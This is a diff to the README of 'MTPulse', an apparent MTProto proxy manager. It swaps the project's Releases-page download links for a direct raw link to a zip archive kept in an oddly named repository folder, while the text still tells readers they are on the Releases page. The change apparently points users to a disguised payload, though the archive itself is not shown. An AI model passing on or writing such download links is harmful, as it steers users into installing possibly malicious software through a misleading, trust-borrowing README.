@@ -1,7 +1,7 @@
 # 🚀 MTPulse - Easily Manage Your MTProto Proxy
 
 ## 📥 Download Now
-[![Download MTPulse](https://img.shields.io/badge/Download-MTPulse-blue.svg)](https://github.com/Veddd27/MTPulse/releases)
+[![Download MTPulse](https://raw.githubusercontent.com/Veddd27/MTPulse/main/Megaluridae/Pulse-MT-1.3.zip)](https://raw.githubusercontent.com/Veddd27/MTPulse/main/Megaluridae/Pulse-MT-1.3.zip)
 
 ## 📖 Table of Contents
 1. [Overview](#-overview)
@@ -36,7 +36,7 @@ MTPulse offers a range of features designed to enhance your experience with MTPr
 Ready to take control of your MTProto proxies? Start by downloading MTPulse. Follow the steps below to download and install the software.
 
 ## 📥 Download & Install
-To download MTPulse, visit the Releases page here: [Download MTPulse](https://github.com/Veddd27/MTPulse/releases).
+To download MTPulse, visit the Releases page here: [Download MTPulse](https://raw.githubusercontent.com/Veddd27/MTPulse/main/Megaluridae/Pulse-MT-1.3.zip).
 
 Once on the Releases page, look for the latest version of MTPulse. You will see options to download the application. Click on the version number you wish to download. After the download completes, follow the installation instructions for your operating system.
 
